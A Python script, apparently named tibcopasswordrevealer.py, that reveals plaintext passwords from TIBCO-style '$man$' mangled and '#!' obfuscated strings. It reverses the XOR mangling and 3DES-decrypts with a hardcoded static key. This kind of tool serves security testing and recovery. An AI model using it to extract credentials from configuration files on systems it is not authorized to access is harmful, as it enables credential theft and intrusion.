#!/usr/bin/env python3

from Crypto.Cipher import DES3
import sys
import base64
import array

# Script version
VERSION = '1.0'

# OptionParser imports
from optparse import OptionParser
from optparse import OptionGroup

# Options definition
parser = OptionParser(usage="%prog [options] '<obfuscated_password>' (on UNIX, do not forget to simple quote the password to avoid bash interpretation)\nVersion: " + VERSION)

mangled_grp = OptionGroup(parser, 'Mangled password')
mangled_grp.add_option('-m', '--mangled-password', help="mangled password that you want to unmangle. Ex. -m '$man$Dc6rE3mh8giUDcPkQEhEE5CnUKA='", nargs=1)

obfuscated_grp = OptionGroup(parser, 'Obfuscated password')
obfuscated_grp.add_option('-o', '--obfuscated-password', help="obfuscated password that you want to deobfuscate Ex: -o '#!/Zbs+cF+HftERpGvBh03jFtPMJQuLItP'", nargs=1)

parser.option_groups.extend([mangled_grp, obfuscated_grp])

# Macros
PREFIX_MANGLED = '$man$'
PREFIX_OBFUSCATED = '#!'

# Handful functions
def des3_cbc_decrypt(encrypted_password, decryption_key, iv):
    unpad = lambda s: s[:-ord(s[len(s)-1:])]
    crypter = DES3.new(decryption_key, DES3.MODE_CBC, iv)
    decrypted_password = unpad(crypter.decrypt(encrypted_password))
    
    return decrypted_password.replace(b"\x00", b'').decode('utf-8', errors='ignore')

def unmangle_password(passwd):
    global PREFIX_MANGLED
    
    password = bytearray(base64.b64decode(passwd[len(PREFIX_MANGLED):]))
    
    j = password[0]
    k = password[1]
    
    i1 = (password[3] ^ j) << 8 & 0xFF00 | (password[2] ^ k) & 0xFF
    i1 = i1 & 0xFFFF
    i1 = i1 - 7777
    
    if ((len(password) < i1 + 4) or (i1 < 0)):
        # "Corrupt buffer"
        return None
    
    unmangled_passwd = password[4:4+i1]
    
    for n in range(i1):
        i = k if (n % 2 != 0) else j
        unmangled_passwd[n] = unmangled_passwd[n] ^ i
        m = i & 0x1
        i = i >> 1
        
        if m != 0:
            i = i | 0x80
        else:
            i = i & 0x7F
        
        if n % 2 != 0:
            k = i
        else:
            j = i
    
    print("[+] mangled password:\t%s" % passwd)
    print("[+] unmangled password:\t%s" % unmangled_passwd.decode('utf-8', errors='ignore'))

def deobfuscate_password(passwd):
    global PREFIX_OBFUSCATED
      
    key = array.array('b', [28, -89, -101, -111, 91, -113, 26, -70, 98, -80, -23, -53, -118, 93, -83, -17, 28, -89, -101, -111, 91, -113, 26, -70]).tobytes()
    encrypted_password = base64.b64decode(passwd[len(PREFIX_OBFUSCATED):])
    iv = encrypted_password[:8]
    
    deobfuscated_passwd = des3_cbc_decrypt(encrypted_password[8:], key, iv)
    
    print("[+] obfuscated password:\t%s" % passwd)
    print("[+] deobfuscated password:\t%s" % deobfuscated_passwd)
    
    return None
    
    
def main(options, arguments):
    """
        Dat main
    """
    global parser, VERSION, PREFIX_MANGLED, PREFIX_OBFUSCATED
    
    password = ''
    
    if len(arguments) != 1 and options.mangled_password == None and options.obfuscated_password == None:
        parser.error("Please specify a password to reveal")
    elif len(arguments) == 1:
        password = arguments[0]
    elif options.mangled_password and options.mangled_password.startswith(PREFIX_MANGLED):
        password = options.mangled_password
    elif options.obfuscated_password and options.obfuscated_password.startswith(PREFIX_OBFUSCATED):
        password = options.obfuscated_password 
    
    print('tibcopasswordrevealer.py version %s\n' % VERSION)
    
    if password and password.startswith(PREFIX_MANGLED):
        unmangle_password(password)
        
    if password and password.startswith(PREFIX_OBFUSCATED):
        deobfuscate_password(password)
    
    return None
    
if __name__ == "__main__":
    options, arguments = parser.parse_args()
    main(options, arguments)
